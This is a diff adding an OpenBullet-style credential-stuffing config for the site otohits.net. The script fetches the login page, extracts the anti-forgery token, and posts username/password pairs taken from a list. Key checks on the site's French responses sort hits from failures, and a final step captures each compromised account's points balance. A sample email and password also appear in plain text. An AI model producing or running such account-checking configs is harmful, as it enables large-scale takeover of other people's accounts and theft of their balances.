@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "otohits.net",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-18T23:46:31.4979266+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.otohits.net/account/login" 
+  CONTENT "__RequestVerificationToken=ZT_BBr2vnqrit1LiC9Wka8xFEfW0SmNjvaBUv5WymaYuvbJPiWVElTAqzYy_r4XgwziI2obf1YZ7A5FN1rt9ruADNzi1tqmlo1U_xTyesUo1&ReturnUrl=&Email=vyrusthemofo%40gmail.com&Password=asdasd123" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.otohits.net" 
+  HEADER "Origin: https://www.otohits.net" 
+  HEADER "Referer: https://www.otohits.net/account/login?cl=en" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+
+PARSE "<SOURCE>" CSS "[name=__RequestVerificationToken]" "value" -> VAR "TOKEN" 
+
+REQUEST POST "https://www.otohits.net/account/login" 
+  CONTENT "__RequestVerificationToken=<TOKEN>&ReturnUrl=&Email=<USER>&Password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.otohits.net" 
+  HEADER "Origin: https://www.otohits.net" 
+  HEADER "Referer: https://www.otohits.net/account/login?cl=en" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Compte introuvable (mauvais email ou mot de passe" 
+  KEYCHAIN Success OR 
+    KEY "Se d&#233;connecter" 
+    KEY "Points" 
+
+PARSE "<SOURCE>" LR "span class=\"ptsh\">" "</span> Points" -> CAP "Points" 
+
